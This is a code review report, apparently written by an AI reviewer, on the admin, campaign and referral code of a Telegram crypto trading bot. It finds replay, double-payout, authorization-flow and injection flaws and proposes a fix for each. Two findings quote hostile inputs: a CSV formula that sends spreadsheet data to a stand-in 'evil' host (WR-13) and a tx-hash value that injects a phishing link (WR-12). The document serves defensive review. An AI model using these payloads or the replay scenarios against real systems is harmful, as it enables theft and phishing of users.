---
phase: 03-admin-campaign-referral
reviewed: 2026-10-05T17:14:55Z
depth: deep
files_reviewed: 8
files_reviewed_list:
  - bot/handlers/admin.py
  - bot/handlers/admin_campaign.py
  - services/campaign_service.py
  - bot/handlers/referral.py
  - services/referral_discount_service.py
  - services/loyalty_service.py
  - services/testimony_service.py
  - services/report_service.py
findings:
  critical: 4
  warning: 16
  info: 5
  total: 25
status: issues_found
---

# Phase 03: Admin / Campaign / Referral Code Review Report

**Reviewed:** 2026-10-05T17:14:55Z
**Depth:** deep (traced into database/crud.py, bot/handlers/start.py, bot/handlers/balance.py, bot/handlers/buy.py, bot/handlers/sell.py, services/detector.py, services/tx_verifier.py, services/payout_watchdog.py, main.py)
**Files Reviewed:** 8
**Status:** issues_found

## Summary

Authorization is consistently enforced: every admin command, every `admin_*` callback, `camp_*` callbacks (`campaign_callback_handler`), and both text routers check `is_admin()` (`settings.ADMIN_CHAT_IDS`) before acting. Routing goes through `start.menu_callback_handler`, and no admin branch reaches money-moving code without that check. No authorization bypass was found.

The money-moving admin actions themselves are where the risk is:
- None of them is idempotent.
- The reject handlers have no status guards.
- The admin's "re-verify sell deposit" path skips the anti-replay controls that the automatic detector enforces.

The treasury and "Hard Budget Cap" are accounting fiction, because nothing ever debits the treasury. Two advertised reward programs (the referral discount and loyalty) are effectively unreachable in normal flows. Several admin screens break with Telegram HTML parse errors when they show user-controlled text, and one of those breaks hides the "Selesaikan Manual" recovery button.

PTB runs without `concurrent_updates` (main.py:473-479), so updates are handled one at a time. That serializes double-taps, but it does not stop them: each tap still runs to completion and repeats the payout.

## Critical Issues

### CR-01: Admin sell re-verification lets one deposit settle two sell orders (replay)

**File:** `bot/handlers/admin.py:2438-2457`, `bot/handlers/admin.py:2512-2517`, `bot/handlers/admin.py:2605-2608` (root cause: `bot/handlers/sell.py:635`)
**Issue:** `sell.py:635` stores the raw text the user typed (`order.deposit_tx_hash = tx_hash`), not the output of `normalize_tx_hash()`. The admin path `_reverify_sell_deposit()` passes that raw string to `DepositDetector._is_hash_used()` (detector.py:521-534), which compares exact strings against `DepositClaim.tx_hash` and against `Order.deposit_tx_hash`. Both of those hold the normalized form (detector.py:286-304). `tx_verifier.verify_deposit()` then normalizes internally (tx_verifier.py:500) and verifies the same on-chain tx. On success the admin path sets `CRYPTO_CONFIRMED` through `update_order_status()`. It never inserts a `DepositClaim` and skips the detector's "competing equal-amount order" guard (detector.py:219-228).
**Scenario:** The user opens sell orders A and B for the same amount on the same hot wallet and sends one deposit with hash H.
1. User submits `0xH` for A. The detector confirms A and writes `DepositClaim(H)`.
2. User submits `https://bscscan.com/tx/0xH` (or uppercase hex, or H without `0x`) for B. The detector rejects it because H is already used.
3. The admin presses "Konfirmasi" on B. `build_admin_orders_view` shows that button for `WAITING_CRYPTO_DEPOSIT` sell orders (admin.py:239-243). `/verifysell B` behaves the same way.
4. The raw-string check misses, verification passes, and B moves to `CRYPTO_CONFIRMED` and then `completed`. The admin transfers Rupiah twice for one deposit.

**Fix:** Normalize first, then use the same claim path as the detector:
```python
tx_hash = tx_verifier.normalize_tx_hash(order.network, raw)
if DepositDetector._is_hash_used(db, tx_hash, exclude_order=order.order_id): return {...replay...}
# on verified: call deposit_detector._confirm_order(db, order, tx_hash, verified, app)
# (inserts DepositClaim under the unique constraint + status-guarded UPDATE)
```
Also store the normalized hash in sell.py:635. In `admin_force_sell_callback`, refuse when the order's hash is already in `DepositClaim` for another order.

### CR-02: Top Spender and Random Draw pay out on one click, with no confirmation and no idempotency

**File:** `bot/handlers/admin.py:645-650,1631-1665` and `bot/handlers/admin.py:711-721,1677-1714`. `services/campaign_service.py:499-606,643-742`
**Issue:**
- The "💰 Eksekusi & Bagikan Hadiah ke Top 10" button and the "🎲 Undi N Orang" buttons pay out immediately.
- `execute_top_spender_campaign` and `execute_random_winner_campaign` create a new `Campaign` row every time (the code is timestamped), with no DRAFT/confirm step and no "already paid for this period" guard.
- After execution the handler re-renders the same keyboard (1663-1665, 1712-1714), so the execute button stays live.
- The handler answers the callback first (1638 / 1685) and calls `query.answer(...)` again with the result (1658 / 1707). Telegram normally rejects a second answer to the same query. If it does, the admin never sees the success alert, which invites a retry.

**Scenario:** The admin taps "Eksekusi" twice, or taps again because no alert appeared. The top 10 receive Rp 455.000 twice. Random draw pays another N random users each time.
**Fix:** Use the existing two-phase pattern from `admin_campaign` (create a DRAFT `Campaign`, show a preview, then `camp_confirm_exec_{id}` with a status-guarded `UPDATE ... WHERE status='DRAFT'`). For Top Spender, also reject a second execution for the same `period_days` window, for example with a unique `campaign_code` per period such as `TOP_SPENDER_30D_2026-10`. Edit the message to remove the execute button before paying out.

### CR-03: The "Kirim Saldo" confirmation button can be replayed and credits each time

**File:** `bot/handlers/admin.py:973`, `bot/handlers/admin.py:1352-1371`
**Issue:** `admin_send_bal_confirm_{tid}_{amount}` calls `crud.credit_user_balance()` unconditionally. There is no nonce, no pending-transfer record, and no state check. The cleared `user_data` keys are not consulted on this branch. `amount` comes straight from the callback string with no bounds re-check, so negative or huge values are accepted. The confirmation message keeps its button until the final edit, and any older copy of the confirmation stays live forever.
**Scenario:** The admin double-taps "🚀 Ya, Kirim Saldo Sekarang!". Or days later they scroll up and tap an old confirmation. Either way the user is credited again with spendable balance that buys real crypto.
**Fix:** Store a single-use token in `context.user_data["admin_send_bal_pending"] = {"nonce": uuid4().hex, "tid": ..., "amount": ...}`. Put only the nonce in the callback. On confirm, `pop()` the token and require the nonce to match. Re-validate `1_000 <= amount <= 10_000_000`.

### CR-04: Reject handlers have no status guards and can confiscate funds or overwrite completed orders

**File:** `bot/handlers/admin.py:3259-3287` (buy), `bot/handlers/admin.py:3404-3441` (swap), `bot/handlers/admin.py:3336-3363` (topup)
**Issue:** Each reject handler writes its status unconditionally.

`admin_reject_buy_callback`:
- Sets `rejected` on any order, including `completed`, `payout_processing`, and a `BOT_BALANCE` order whose balance was already deducted (buy.py:755).
- Never refunds that balance.
- Every admin and the topic group receive their own copy of the approve/reject keyboard. Editing one copy does not disable the others.

`admin_reject_swap_callback`:
- Sets `CANCELLED` even when the order is `CRYPTO_CONFIRMED` (user's deposit received) or payout is in progress.

`admin_reject_topup_callback`:
- Overwrites `SUCCESS` with `CANCELLED` and tells the user the topup was rejected after the balance was already credited.

**Scenario:** Admin 1 approves a `manual_review` BOT_BALANCE buy. Admin 2 presses "Tolak" on their own copy. The status flips to `rejected` and the user is told "Ditolak". Or, if the payout failed, the user loses the deducted balance with no refund. For swaps, an admin rejecting from a stale order list after the detector confirmed the deposit keeps the user's crypto and pays nothing.
**Fix:** Use atomic guarded transitions, for example:
```python
res = db.execute(update(Order).where(Order.order_id==oid, Order.status.in_(("pending","manual_review")), Order.payout_tx_hash.is_(None)).values(status="rejected"))
if res.rowcount != 1: return await query.answer("Order sudah diproses.", show_alert=True)
if order.payment_method == "BOT_BALANCE": crud.credit_user_balance(db, order.telegram_id, float(order.total_idr))
```
For swaps, allow reject only in `WAITING_CRYPTO_DEPOSIT` without a `DepositClaim`. For topups, allow reject only from `PENDING` (mirror `claim_topup_success`).

## Warnings

### WR-01: `/confirm` completes buy orders in any status and triggers the referral payout

**File:** `bot/handlers/admin.py:2389-2402` (with `database/crud.py:228-233`)
**Issue:** Only sell orders are status-checked. For a buy order that is `pending` (never paid), `expired`, `rejected`, or `CANCELLED`, `/confirm` sets it to `completed`. `update_order_status` then runs `complete_referral()`, which credits the referrer reward and the referee bonus. The user is also told the purchase completed.
**Fix:** Require `order.status in ("paid","manual_review","payout_processing")` for buy orders. Require an explicit `--force` argument that writes an AuditLog entry for anything else.

### WR-02: Leftover wizard flags capture unrelated admin input (treasury reset, referral reward change)

**File:** `bot/handlers/admin.py:1428-1456,1519-1592,3891-4049`. `bot/handlers/admin_campaign.py:183-187`. `bot/handlers/start.py:425-427`
**Issue:**
- The "Batal" buttons for treasury custom/set-manual use `callback_data="camp_treasury_view"`. start.py routes `camp_*` to `campaign_callback_handler`, which never clears `admin_awaiting_treasury_*`. The flag-clearing branch at admin.py:1413-1415 is unreachable for that callback.
- The referral custom-input flags have no cancel button at all.
- `admin_interactive_text_router` checks these flags before the campaign handler.

**Scenario:** The admin opens "🔄 Atur Saldo Manual", presses Batal, and later types `750000` as a campaign custom budget. The treasury is set to 750000 and the campaign input is swallowed. With a leftover referral flag, typing `5000` silently changes `reward_per_referral`. A leftover `admin_awaiting_send_bal_user` makes every later admin text message a username lookup.
**Fix:** Clear all `admin_awaiting_*` keys on every navigation callback, for example with a helper called at the top of both callback routers. Also route `camp_treasury_view` through the branch that pops the flags.

### WR-03: Manual topup approval credits the gross amount and ignores treasury topups

**File:** `bot/handlers/admin.py:3314`. Compare `bot/handlers/balance.py:308-314` and `main.py:946-950`
**Issue:** The automatic paths credit `amount_idr - mdr_idr` and send `TREASURY-*` topups to `topup_bot_treasury`. `admin_approve_topup_callback` credits the full `amount_idr` to `topup.telegram_id`.
**Scenario:**
1. An admin creates a Treasury QRIS invoice (admin.py:1077-1086, `telegram_id = admin`).
2. The admin later sends any photo in DM. `_route_transfer_proof` (main.py:625) forwards it as topup "proof".
3. "Approve" credits the treasury money to the admin's personal, crypto-spendable balance, MDR included.

Every manual approval of a normal topup also over-credits by the 0.3% MDR.
**Fix:** In `admin_approve_topup_callback`, compute `net = amount_idr - (mdr_idr or 0)` and branch on the `TREASURY-` prefix exactly like `main._complete_topup`. Better still, call `_complete_topup` directly.

### WR-04: The treasury is never debited, so the "Hard Budget Cap" does not limit spending

**File:** `database/crud.py:2242` (`deduct_bot_treasury` has no callers). `services/campaign_service.py:295-463,499-775`. `bot/handlers/admin.py:1352-1371,3561-3764`
**Issue:**
- No campaign, top-spender run, random draw, referral, loyalty reward, `/credit`, `/bulkcredit` or "Kirim Saldo" checks or debits `bot_treasury_balance_idr`.
- Anyone pressing a preset button can "top up" the treasury with no money behind it (admin.py:1420-1425, 4084).

The UI promises "Sistem menjamin total saldo keluar tidak akan pernah melebihi budget" (admin_campaign.py:140), but with treasury Rp 0 an admin can still hand out unlimited spendable balance.
**Fix:** Before each distribution, check `get_bot_treasury_balance() >= total`. Debit the treasury in the same transaction as the user credits, with a conditional `UPDATE` so concurrent runs cannot overdraw. Remove the button-press "+Rp X" topups or label them as accounting adjustments.

### WR-05: Referrals attach to existing users, and `complete_referral` can pay the referrer twice

**File:** `bot/handlers/start.py:185-192`. `database/crud.py:1243-1285,1294-1353`
**Issue (abuse):** `/start ref_X` creates a referral for any user who has no referral row yet, including long-standing customers with many completed orders. `complete_referral` never checks that this is the referee's first transaction. Any existing customer can attach a friend's code and both collect the reward and bonus on the next trade. The referrer can be non-existent or banned, and A↔B mutual referrals are allowed.
**Issue (non-atomic):** `credit_user_balance()` commits (crud.py:977) before `ref.status = "COMPLETED"`. If crediting the referee bonus or the commit afterwards fails, `db.rollback()` cannot undo the referrer credit, and the referral stays `PENDING`. The next completed order credits the referrer again.
**Fix:**
- In `create_referral`, refuse when the referee has any order, or `created_at` is older than a few minutes, or the referrer is banned or missing.
- In `complete_referral`, claim first with `UPDATE referrals SET status='COMPLETED' WHERE referee_id=:r AND status='PENDING'` (rowcount == 1), then credit both sides in the same transaction without intermediate commits.

### WR-06: The referral discount and loyalty rewards never trigger in normal flows

**File:** `services/payout_watchdog.py:167,203,224`. `database/crud.py:228-231`. `services/loyalty_service.py:217`
**Issue:**
- `activate_discount_for_referrer` is called only when `complete_referral()` returns True at watchdog:203. The `update_order_status(..., "completed")` call one line earlier (167) has already completed the referral, so 203 always returns False. The "diskon 10% untuk 10x transaksi" advertised in referral.py:75 is never granted.
- `process_loyalty_after_order` is called only from the payout watchdog recovery path. Normal completions (buy finalize, sell/admin confirm, swap) never count toward loyalty.
- `run_loyalty_check_job` is never scheduled.

**Fix:** Run one post-completion hook (referral, discount activation, loyalty, testimony) inside `update_order_status` when the status changes to completed, or from a single `on_order_completed()` called by every completion path, guarded so it runs once per order.

### WR-07: Random draw is broken for the default pool `ACTIVE_30D`

**File:** `bot/handlers/admin.py:711-721,1679-1683`
**Issue:** The callback `admin_draw_exec_ACTIVE_30D_5_25000` is split on `_`, giving `["ACTIVE","30D","5","25000"]`. `int("30D")` raises ValueError and the admin gets "❌ Error". The default pool's buttons never work.
**Fix:** Parse from the right: `pool_seg, cnt, amt = payload.rsplit("_", 2)`. Validate `pool_seg in {"ALL","BUYERS","ACTIVE_30D"}`.

### WR-08: In RANDOM campaigns the preview shows different winners from the ones paid

**File:** `services/campaign_service.py:316-328` (re-simulation), `services/campaign_service.py:191-196`
**Issue:** `execute_campaign` calls `simulate_campaign` again, and RANDOM mode re-samples with `SystemRandom().sample`. The "Daftar Pemenang Terpilih" list the admin approved is not the list that gets paid.
**Fix:** Save the previewed winner IDs on the DRAFT (for example a JSON column or `CampaignDistribution` rows with status `PLANNED`). Execute exactly that set, re-checking ban status only.

### WR-09: Campaign notifications are fired unthrottled, success is overcounted, and bad custom HTML fails silently

**File:** `services/campaign_service.py:440-453,466-477`. `bot/handlers/admin_campaign.py:613-632`
**Issue:**
- `execute_campaign` calls `asyncio.create_task` once per winner, with no pacing and no RetryAfter handling. EQUAL_SPLIT to all buyers floods the Bot API (~30 msg/s limit), and the 429 responses are dropped with an `info` log.
- `notif_success` counts scheduled tasks, not delivered messages.
- If an admin types malformed HTML in the custom message, every notification fails parsing silently.
- The preview `reply_text` (admin_campaign.py:628) raises inside `campaign_text_input_handler`, which has no `except`.

**Fix:** Reuse `_send_broadcast_to_user` (pacing, RetryAfter, plain-text fallback) in a single background task. Count real successes. Validate the custom template by sending the preview inside try/except and falling back to the escaped text.

### WR-10: `/broadcast` stops the bot from serving all users for the whole run

**File:** `bot/handlers/admin.py:3096-3104`. `main.py:473-479`
**Issue:** The broadcast loop runs inside the update handler (about 20 msg/s, plus RetryAfter sleeps). The Application is built without `concurrent_updates`, so no other update is processed until it finishes. With 5k users that is minutes of a dead bot, including payment "Cek" buttons and order flows.
**Fix:** Run the loop with `context.application.create_task(...)`, or enable `concurrent_updates`. Use PTB's `AIORateLimiter`.

### WR-11: Unescaped user-controlled text in `parse_mode="HTML"` breaks admin screens

**File:**

| Location | Unescaped value |
|---|---|
| `bot/handlers/admin.py:333-334` | banned user `full_name` |
| `bot/handlers/admin.py:309-311` | `AuditLog.details`, which includes the raw user-submitted tx hash (admin.py:2575, detector.py:189) |
| `bot/handlers/admin.py:2522-2526` | raw `deposit_tx_hash` and `reason` |
| `bot/handlers/admin.py:2663` | `order.buyer_wallet` (free-form bank text, sell.py:273-276) |
| `bot/handlers/admin.py:2104,2112,2126` | sticker-set title, exception text |
| `bot/handlers/admin.py:3495,3536,3552` | group title |

**Scenario:** A seller enters the bank holder name `Budi <3`, or a hash URL such as `https://x.y/<b/0x<64hex>`, which passes `normalize_tx_hash`. Then:
- "Upload Bukti" fails.
- The re-verify failure message at 2520 raises BadRequest, so the "⚠️ Selesaikan Manual" button is never delivered.
- The Audit Trail panel fails until the entry leaves the top 10.

**Fix:** Wrap every interpolated DB or user value in `html.escape(str(x))`. Store only the normalized tx hash (see CR-01).

### WR-12: The testimony post builds an `href` from an unescaped tx hash, and `/posttesti` posts orders that never completed

**File:** `services/testimony_service.py:54,128-130,190`. `bot/handlers/admin.py:1986-1992`
**Issue:**
- `get_explorer_url_for_tx` puts the raw hash into `<a href="...">`. For sell orders the hash is `deposit_tx_hash`, which stays as the user's raw text whenever confirmation went through the admin path (CR-01 / force-sell).
- A value such as `https://x.y/">KLAIM BONUS t.me/scam</a><a href="https://e/0x<hex>` still passes validation (only the last path segment is checked) and renders a phishing link in the public testimony channel.
- Separately, `/posttesti` posts "Transaksi Selesai" for any order ID regardless of status.

**Fix:**
- Normalize the hash, or only accept `[0-9A-Za-z]` (and `_` / `-` for base64 hashes).
- Escape it with `html.escape(url, quote=True)`.
- Require `order.status.lower() == "completed"` in `resend_testimony_command_handler`.

### WR-13: CSV formula injection in the weekly report export

**File:** `services/report_service.py:167-186`
**Issue:** `full_name` (any Telegram display name), `destination` (free-form bank text) and `tx_hash` are written as-is. A name such as `=HYPERLINK("https://evil/?"&B2,"klik")` runs when the admin opens the file in Sheets or Excel, which this export is meant for.
**Fix:** Prefix any cell that starts with `= + - @ \t \r` with `'`.

### WR-14: `/bulkcredit` credits repeated IDs more than once and has no total cap

**File:** `bot/handlers/admin.py:3686-3722`
**Issue:** `target_ids` is not deduplicated. `/bulkcredit 1000000 123 123 123` credits Rp 3.000.000 to user 123. There is no upper bound on `len(target_ids) * amount`.
**Fix:** Use `target_ids = list(dict.fromkeys(target_ids))`. Cap the total, or require a confirmation step above a threshold.

### WR-15: Proof upload re-completes an already-completed sell order and re-posts the testimony

**File:** `bot/handlers/admin.py:2681-2753`
**Issue:**
- There is no `was_already_completed` guard, unlike `_finish_sell_order`.
- The pending order ID lives in `user_data` until the next photo is sent. If the admin taps "Upload Bukti" on order A and later sends a photo meant for order B, A is completed and the proof goes to A's user.
- Each upload re-sends the user notification and posts another testimony.

**Fix:** Bind the photo to the order explicitly (for example, require a reply to the prompt message) and skip the status update and testimony when the order is already completed.

### WR-16: Admin can approve an `expired` buy order and pay out at the stale quote with no payment re-check

**File:** `bot/handlers/admin.py:3234-3245`. `bot/handlers/buy.py:982-987`
**Issue:** `expired` is an accepted status, and `finalize_gopay_buy_payment(allow_admin=True)` then sends `order.crypto_amount`, which was quoted possibly hours earlier. No GoPay mutation check runs on this path; the decision rests only on the photo.
**Fix:** For `expired` orders, require a positive `gopay_service.check_payment(...)` or a re-quote, and log the override in the audit log.

## Info

### IN-01: `get_user_by_identifier` is defined twice
**File:** `database/crud.py:92` and `database/crud.py:2133`. The second definition silently replaces the first. Usernames are not unique (`models.py:10`, and a stale username can belong to two rows), so `.first()` may pick the wrong user in "Kirim Saldo". Remove the duplicate, and when a username matches more than one row, ask for the numeric ID.

### IN-02: The weekly report status buckets do not match the stored statuses
**File:** `services/report_service.py:104-107`. `WAITING_CRYPTO_DEPOSIT`, `PAID`, `PAYOUT_PROCESSING`, `MANUAL_REVIEW`, `CRYPTO_CONFIRMED` and `REJECTED` fall into neither "pending" nor "failed", so the totals do not add up.

### IN-03: Treasury topup IDs can collide
**File:** `bot/handlers/admin.py:1067`. `TREASURY-{int(timestamp)}` collides when two invoices are created in the same second. Use `uuid4().hex[:8]`.

### IN-04: Background tasks are started without keeping a reference
**File:** `bot/handlers/admin.py:2753,3243`. Bare `asyncio.create_task(...)` can be garbage-collected, and its exceptions are never observed. Use `context.application.create_task`.

### IN-05: Callback queries are answered twice
**File:** `bot/handlers/admin.py:1214`, `1638/1652/1658`, `1685/1701/1707`. `admin_campaign.py:164/215`. The second `query.answer()` is normally rejected, so the result alert is lost and the outer `except` re-answers. Answer once, at the end.

---

_Reviewed: 2026-10-05T17:14:55Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
